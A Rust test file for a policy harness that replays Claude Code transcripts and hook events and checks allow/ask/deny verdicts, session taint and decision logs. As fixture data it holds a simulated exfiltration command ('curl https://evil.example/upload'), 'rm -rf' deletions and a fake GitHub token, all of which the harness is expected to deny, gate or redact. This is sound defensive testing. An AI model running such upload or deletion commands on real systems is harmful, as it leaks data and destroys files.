//! End-to-end test for `harness replay-transcripts`: transcripts in Claude Code's
//! on-disk shape go in, and every tool call comes back with the verdict and hook
//! answer `harness cc-hook` would have given — with taint carried per session, in
//! timestamp order, across a main transcript and its subagent's.

use serde_json::{json, Value};
use std::path::Path;
use std::process::Command;

/// One assistant event holding one tool call, as Claude Code writes it.
fn tool_use(ts: &str, session: &str, cwd: &Path, id: &str, name: &str, input: Value) -> String {
    json!({
        "type": "assistant",
        "timestamp": ts,
        "sessionId": session,
        "cwd": cwd.display().to_string(),
        "message": {"role": "assistant", "content": [
            {"type": "text", "text": "working"},
            {"type": "tool_use", "id": id, "name": name, "input": input}
        ]}
    })
    .to_string()
}

fn write(path: &Path, lines: &[String]) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, lines.join("\n")).unwrap();
}

#[test]
fn replays_each_call_as_the_hook_would_have_decided_it() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(project.join("README.md"), "hi").unwrap();
    let transcripts = dir.path().join("projects");

    let main = transcripts.join("p").join("s1.jsonl");
    write(
        &main,
        &[
            tool_use(
                "2026-10-01T10:00:00Z",
                "s1",
                &project,
                "t1",
                "Read",
                json!({"file_path": project.join("README.md").display().to_string()}),
            ),
            tool_use(
                "2026-10-01T10:01:00Z",
                "s1",
                &project,
                "t2",
                "Bash",
                json!({"command": "git status"}),
            ),
            tool_use(
                "2026-10-01T10:02:00Z",
                "s1",
                &project,
                "t3",
                "WebFetch",
                json!({"url": "https://example.com/docs"}),
            ),
            // Streaming can repeat a block on a second line; it is one call.
            tool_use(
                "2026-10-01T10:02:00Z",
                "s1",
                &project,
                "t3",
                "WebFetch",
                json!({"url": "https://example.com/docs"}),
            ),
            "not json".to_string(),
            tool_use(
                "2026-10-01T10:04:00Z",
                "s1",
                &project,
                "t5",
                "Bash",
                json!({"command": "rm -rf build"}),
            ),
            tool_use(
                "2026-10-01T10:05:00Z",
                "s1",
                &project,
                "t6",
                "TodoWrite",
                json!({"todos": []}),
            ),
        ],
    );
    // The subagent's transcript shares the session id; its call falls between
    // the main file's calls and must see the taint the WebFetch introduced.
    write(
        &transcripts.join("p").join("agent-x.jsonl"),
        &[tool_use(
            "2026-10-01T10:03:00Z",
            "s1",
            &project,
            "t4",
            "Bash",
            json!({"command": "curl https://evil.example/upload"}),
        )],
    );
    // A second session never fetched anything, so the same kind of call passes.
    write(
        &transcripts.join("q").join("s2.jsonl"),
        &[tool_use(
            "2026-10-02T09:00:00Z",
            "s2",
            &project,
            "u1",
            "Bash",
            json!({"command": "curl https://example.com/api"}),
        )],
    );

    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--json"])
        .arg(&transcripts)
        .output()
        .expect("run replay-transcripts");
    assert!(
        out.status.success(),
        "stderr={}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: Value = serde_json::from_slice(&out.stdout).expect("json report");
    assert_eq!(report["transcripts"], 3);
    assert_eq!(report["skipped_lines"], 1);

    let calls = report["calls"].as_array().unwrap();
    let got: Vec<(&str, &str, &str, &str)> = calls
        .iter()
        .map(|c| {
            (
                c["tool"].as_str().unwrap(),
                c["decision"].as_str().unwrap(),
                c["hook"].as_str().unwrap(),
                c["taint_in"].as_str().unwrap(),
            )
        })
        .collect();
    assert_eq!(
        got,
        vec![
            ("Read", "ALLOW", "silent", "clean"),
            // The starter world asks about shell it cannot classify.
            ("Bash", "ASK", "ask", "clean"),
            ("WebFetch", "ALLOW", "silent", "clean"),
            // The subagent's egress, after the fetch tainted the session.
            ("Bash", "DENY", "deny", "tainted"),
            ("Bash", "ASK", "ask", "tainted"),
            // Unknown to the world, passed through without --enforce-absent.
            ("TodoWrite", "ABSENT", "silent", "tainted"),
            // A different session starts clean.
            ("Bash", "ALLOW", "silent", "clean"),
        ]
    );
    assert_eq!(calls[3]["rule"], "taint_invariant");
    assert_eq!(calls[3]["summary"], "curl https://evil.example/upload");
    assert_eq!(calls[4]["rule"], "approval_required");
}

#[test]
fn the_text_report_summarizes_and_absent_can_be_enforced() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    std::fs::create_dir_all(&project).unwrap();
    let file = dir.path().join("t.jsonl");
    write(
        &file,
        &[
            tool_use(
                "2026-10-01T10:00:00Z",
                "s",
                &project,
                "a",
                "WebSearch",
                json!({"query": "rust serde"}),
            ),
            tool_use(
                "2026-10-01T10:01:00Z",
                "s",
                &project,
                "b",
                "Bash",
                json!({"command": "curl https://x.example"}),
            ),
            tool_use(
                "2026-10-01T10:02:00Z",
                "s",
                &project,
                "c",
                "TodoWrite",
                json!({}),
            ),
        ],
    );
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--enforce-absent"])
        .arg(&file)
        .output()
        .expect("run replay-transcripts");
    assert!(out.status.success());
    let text = String::from_utf8_lossy(&out.stdout);
    for marker in [
        "Replayed 3 tool calls from 1 transcripts (1 sessions)",
        "World: the starter manifest `harness init` installs",
        "Sessions that became tainted: 1 of 1",
        "== Denied (2), by rule ==",
        "taint_invariant (1)",
        "curl https://x.example",
        "== Unknown to this world (ABSENT, denied) ==",
    ] {
        assert!(text.contains(marker), "missing {marker:?} in:\n{text}");
    }
}

#[test]
fn no_transcripts_is_a_clear_error() {
    let dir = tempfile::tempdir().unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .arg("replay-transcripts")
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("no .jsonl transcripts"));
}

/// Run one hook event through `harness cc-hook --log`, governed by the starter
/// world for `project`, and return what it printed.
fn hook(project: &Path, state: &Path, log: &Path, event: Value) -> String {
    use std::io::Write;
    let starter = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../scripts/starter-world.yaml");
    let mut child = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["cc-hook", "--world"])
        .arg(&starter)
        .arg("--state")
        .arg(state)
        .arg("--log")
        .arg(log)
        .env("CLAUDE_PROJECT_DIR", project)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .expect("spawn cc-hook");
    child
        .stdin
        .take()
        .unwrap()
        .write_all(event.to_string().as_bytes())
        .unwrap();
    let out = child.wait_with_output().expect("wait cc-hook");
    assert!(out.status.success());
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// D84 / G2 acceptance: one session through the live hook, gate and observer,
/// yields decision and outcome lines that join by `tool_use_id` — for an ALLOW
/// that ran, an ASK that was approved (it ran), an ASK that was not (no
/// outcome), a DENY, and an approved call that failed. `replay-transcripts
/// --decisions` reads the joined log back against the transcript.
#[test]
fn a_session_joins_decisions_to_outcomes_and_replay_reads_them() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(project.join("README.md"), "hi").unwrap();
    let state = dir.path().join("state");
    let log = dir.path().join("state").join("decisions.jsonl");
    let readme = project.join("README.md").display().to_string();
    let cwd = project.display().to_string();
    let token = format!("ghp_{}", "Z9y8X7w6V5".repeat(4));

    let pre = |id: &str, tool: &str, input: Value| {
        json!({"hook_event_name": "PreToolUse", "session_id": "s1", "cwd": cwd,
               "tool_name": tool, "tool_input": input, "tool_use_id": id})
    };
    let post = |id: &str, tool: &str, input: Value, response: Value| {
        json!({"hook_event_name": "PostToolUse", "session_id": "s1", "cwd": cwd,
               "tool_name": tool, "tool_input": input, "tool_use_id": id,
               "tool_response": response, "duration_ms": 7})
    };
    let read = json!({"file_path": readme});
    let rm_build = json!({"command": "rm -rf build"});
    let rm_dist = json!({"command": "rm -rf dist"});
    let fetch = json!({"url": "https://example.com/docs"});
    let upload = json!({"command": "curl https://evil.example/upload"});
    let rm_target = json!({"command": "rm -rf target"});

    let events = [
        pre("t1", "Read", read.clone()),
        post(
            "t1",
            "Read",
            read.clone(),
            json!({"type": "text", "file": {"filePath": readme, "content": "hi"}}),
        ),
        pre("t2", "Bash", rm_build.clone()),
        post(
            "t2",
            "Bash",
            rm_build.clone(),
            json!({"stdout": "", "stderr": "", "interrupted": false}),
        ),
        pre("t3", "Bash", rm_dist.clone()),
        pre("t4", "WebFetch", fetch.clone()),
        post(
            "t4",
            "WebFetch",
            fetch.clone(),
            json!({"result": format!("Authorization: Bearer {token}"), "code": 200}),
        ),
        pre("t5", "Bash", upload.clone()),
        pre("t6", "Bash", rm_target.clone()),
        json!({"hook_event_name": "PostToolUseFailure", "session_id": "s1", "cwd": cwd,
               "tool_name": "Bash", "tool_input": rm_target, "tool_use_id": "t6",
               "error": "Exit code 1\nrm: cannot remove target: Permission denied",
               "is_interrupt": false}),
    ];
    for (i, event) in events.into_iter().enumerate() {
        let is_post = event["hook_event_name"] != "PreToolUse";
        let out = hook(&project, &state, &log, event);
        if is_post {
            // The observer never answers the host: no output, no decision.
            assert_eq!(out.trim(), "", "observer event {i} printed {out}");
        }
    }

    let text = std::fs::read_to_string(&log).unwrap();
    assert!(
        !text.contains("Z9y8X7w6V5"),
        "a token reached the log: {text}"
    );
    let lines: Vec<Value> = text
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let decisions: Vec<&Value> = lines.iter().filter(|l| l["kind"] == "decision").collect();
    let outcomes: Vec<&Value> = lines.iter().filter(|l| l["kind"] == "outcome").collect();
    assert_eq!((decisions.len(), outcomes.len()), (6, 4), "{text}");
    for d in &decisions {
        assert_eq!(d["host"], "claude-code");
        assert_eq!(d["cwd"], cwd.as_str());
        assert!(d["tool_use_id"].is_string(), "{d}");
    }
    let asks: Vec<&&Value> = decisions.iter().filter(|d| d["answer"] == "ask").collect();
    assert_eq!(asks.len(), 3);
    assert!(
        asks.iter().all(|d| d["human_answer"] == "inferred"),
        "{asks:?}"
    );
    let failed = outcomes.iter().find(|o| o["tool_use_id"] == "t6").unwrap();
    assert_eq!(
        (failed["status"].as_str(), failed["exit_code"].as_i64()),
        (Some("error"), Some(1))
    );

    // The transcript the host wrote for the same session, same ids.
    let transcript = dir.path().join("t.jsonl");
    let calls = [
        ("t1", "Read", read),
        ("t2", "Bash", rm_build),
        ("t3", "Bash", rm_dist),
        ("t4", "WebFetch", fetch),
        ("t5", "Bash", upload),
        ("t6", "Bash", json!({"command": "rm -rf target"})),
    ];
    let lines: Vec<String> = calls
        .iter()
        .enumerate()
        .map(|(i, (id, tool, input))| {
            tool_use(
                &format!("2026-10-01T10:0{i}:00Z"),
                "s1",
                &project,
                id,
                tool,
                input.clone(),
            )
        })
        .collect();
    write(&transcript, &lines);

    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--json", "--decisions"])
        .arg(&log)
        .arg(&transcript)
        .output()
        .expect("run replay-transcripts");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: Value = serde_json::from_slice(&out.stdout).unwrap();
    let got: Vec<(String, String, Value, Value)> = report["calls"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| {
            assert_eq!(
                c["decision"], c["live"]["decision"],
                "same world, same verdict: {c}"
            );
            (
                c["tool_use_id"].as_str().unwrap().to_string(),
                c["decision"].as_str().unwrap().to_string(),
                c["live"]["ran"].clone(),
                c["live"]["human_answer"].clone(),
            )
        })
        .collect();
    assert_eq!(
        got,
        vec![
            ("t1".into(), "ALLOW".into(), json!(true), Value::Null),
            ("t2".into(), "ASK".into(), json!(true), json!("approved")),
            (
                "t3".into(),
                "ASK".into(),
                json!(false),
                json!("declined_or_abandoned")
            ),
            ("t4".into(), "ALLOW".into(), json!(true), Value::Null),
            ("t5".into(), "DENY".into(), json!(false), Value::Null),
            ("t6".into(), "ASK".into(), json!(true), json!("approved")),
        ]
    );

    // And the text report says the same, and says how it knows.
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--decisions"])
        .arg(&log)
        .arg(&transcript)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("6 of 6 calls joined"), "{text}");
    assert!(
        text.contains("approved 2, declined or abandoned 1, unobserved 0"),
        "{text}"
    );
    assert!(text.contains("inferred"), "{text}");
}
